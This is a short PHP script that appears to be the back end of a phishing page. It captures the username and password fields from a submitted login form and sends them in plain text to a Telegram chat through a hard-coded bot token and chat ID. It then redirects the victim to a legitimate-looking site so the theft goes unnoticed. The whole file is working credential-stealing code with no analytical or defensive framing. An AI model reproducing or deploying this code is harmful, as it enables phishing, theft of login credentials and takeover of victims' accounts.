<?php 


  $apiToken = "5455752571:AAEdPihQynGljHD5Okwnts7pHptiFUyb7_c";
  $data = [
      'chat_id' => '1907947939',
      'text' => 'Username is '.$_POST['_username'].'
Password is '.$_POST['_password']
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );



header("Location: https://smg-cloud.de");
?>